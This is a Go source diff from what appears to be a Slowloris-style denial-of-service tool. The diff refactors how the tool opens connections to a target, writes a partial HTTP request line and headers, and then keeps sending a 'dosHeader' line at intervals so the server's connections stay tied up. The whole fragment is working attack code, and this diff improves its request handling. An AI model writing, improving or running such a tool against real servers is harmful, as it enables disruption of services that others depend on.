@@ -27,6 +27,7 @@ var (
 	target         string
 	https          bool
 	dosHeader      string
+	path           string
 )
 
 func main() {
@@ -116,19 +117,19 @@ loop:
 			defer conn.Close()
 		}
 
-		headers := makeHeaders(target)
-		req, err := createRequest(target, method, resource, headers)
-		if err != nil {
-			fmt.Println(err.Error())
+		if _, err = fmt.Fprintf(conn, "%s %s HTTP/1.1\r\n", method, resource); err != nil {
 			continue
 		}
-		req.Header.Write(conn)
+
+		header := createHeader(target)
+		if err = header.Write(conn); err != nil {
+			continue
+		}
 
 		for {
 			select {
 			case <-time.After(time.Duration(interval) * time.Second):
-				_, err := conn.Write([]byte(dosHeader + "\r\n"))
-				if err != nil {
+				if _, err := fmt.Fprintf(conn, "%s\r\n", dosHeader); err != nil {
 					continue loop
 				}
 			}
@@ -137,20 +138,18 @@ loop:
 
 }
 
-func createRequest(host, method, resource string, headers map[string]string) (*http.Request, error) {
-	req, err := http.NewRequest(method, host, nil)
-	if err != nil {
-		return nil, err
-	}
+func createHeader(host string) *http.Header {
+	hdr := http.Header{}
 
+	headers := makeHeaderSlice(host)
 	for header, value := range headers {
-		req.Header.Add(header, value)
+		hdr.Add(header, value)
 	}
 
-	return req, nil
+	return &hdr
 }
 
-func makeHeaders(host string) map[string]string {
+func makeHeaderSlice(host string) map[string]string {
 	headers := make(map[string]string)
 
 	headers["Host"] = host
